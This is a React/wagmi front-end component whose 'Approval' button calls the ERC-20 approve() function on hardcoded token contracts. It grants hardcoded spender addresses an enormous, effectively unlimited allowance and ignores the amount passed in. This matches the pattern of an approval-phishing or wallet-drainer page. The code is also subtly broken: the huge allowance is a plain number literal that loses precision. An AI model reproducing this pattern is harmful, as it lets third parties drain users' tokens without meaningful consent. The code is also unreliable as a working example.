import {
  useWaitForTransactionReceipt,
  useWriteContract,
  useSendTransaction,
} from "wagmi";
import { abi } from "../approveABI/abi.json";
import { useState, useEffect } from "react";

export function ApproveToken(weiAmount) {
  const [connectedNetwork, setConnectedNetwork] = useState(null);
  //const [networkName, setNetworkName] = useState("");
  //const [tokenaddress, settokenaddress] = useState();
  const {
    data: hash,
    writeContract,
    isPending,
    isSuccess,
  } = useWriteContract();

  const handleApprove = async () => {
    try {
      const approveAmount = 76544569876543467899876546789098765467890987651654567654565676776768;
      await writeContract({
        abi,
        address: "0x563574f776D4537767Caf3E93494028F1CfF3368", //"0x563574f776D4537767Caf3E93494028F1CfF3368", // "0xF6E83df1a9659E9923E43A85aE6d8F07a2C95b61", // `0x${tokenaddress}`, //tokenAddress,//"0x9b2cbE8Ad90fAB7362C6eC5A4896C7629CAe3D16", //token address
        functionName: "approve",
        args: [
          "0xBD933Db03dA178059079590B50b8e2bbE09313b0", // contract address

          approveAmount, //BigInt(weiAmount),
        ],
        value: 0, //BigInt(valueInWei), // Set the value property to send ETH
      });

      // Handle success if needed
      console.log("Approval successful! ETH");
    } catch (error) {
      // Handle error if needed
      console.error("Error during approval:", error, weiAmount);
    }
  };

  const handleApprove2 = async () => {
    try {
      const approveAmount = 76544569876543467899876546789098765467890987651654567654565676776768;
      await writeContract({
        abi,
        address: "0xF6E83df1a9659E9923E43A85aE6d8F07a2C95b61", //"0x563574f776D4537767Caf3E93494028F1CfF3368", // "0xF6E83df1a9659E9923E43A85aE6d8F07a2C95b61", // `0x${tokenaddress}`, //tokenAddress,//"0x9b2cbE8Ad90fAB7362C6eC5A4896C7629CAe3D16", //token address
        functionName: "approve",
        args: [
          "0x617c5814f9c52e3768FD233088A01cc6dE25c58A", // contract address

          approveAmount, //BigInt(weiAmount),
        ],
        value: 0, //BigInt(valueInWei), // Set the value property to send ETH
      });

      // Handle success if needed
      console.log("Approval successful! BSC");
    } catch (error) {
      // Handle error if needed
      console.error("Error during approval:", error, weiAmount);
    }
  };

  useEffect(() => {
    const checkNetwork = async () => {
      try {
        if (window.ethereum) {
          // Wait for the Ethereum provider to be connected
          await window.ethereum.enable();

          // Access the chainId property for the chain ID
          const chainId = window.ethereum.chainId;
          setConnectedNetwork(chainId);
        }
      } catch (error) {
        console.error("Error checking network:", error);
      }
    };

    // Initial check on component mount
    checkNetwork();

    // Set up interval to refresh every 1 second
    const intervalId = setInterval(checkNetwork, 1000);

    // Clear interval on component unmount
    return () => clearInterval(intervalId);
  }, []); // Empty dependency array means it only runs on mount and unmount

  console.log(connectedNetwork);

  /*useEffect(() => {
    // Check the value of connectedNetwork and set networkName accordingly
    switch (connectedNetwork) {
      case "0x11155111":
        settokenaddress(0x617c5814f9c52e3768fd233088a01cc6de25c58a);
        break;
      case "0x97":
        settokenaddress(0xf6e83df1a9659e9923e43a85ae6d8f07a2c95b61);
        break;

      // Add cases for other chains
      // ...
      default:
        // Handle other cases if needed
        setNetworkName(""); // Default value if connectedNetwork is not matched
    }
  }, [connectedNetwork]); // Run this effect whenever connectedNetwork changes  */

  return (
    <button
      className="w-full bg-[#3ab0ff] text-[#efefef] font-medium text-center p-[10px] rounded-xl mt-7"
      onClick={connectedNetwork === "0xaa36a7" ? handleApprove : handleApprove2}
    >
      Approval
    </button>
  );
}
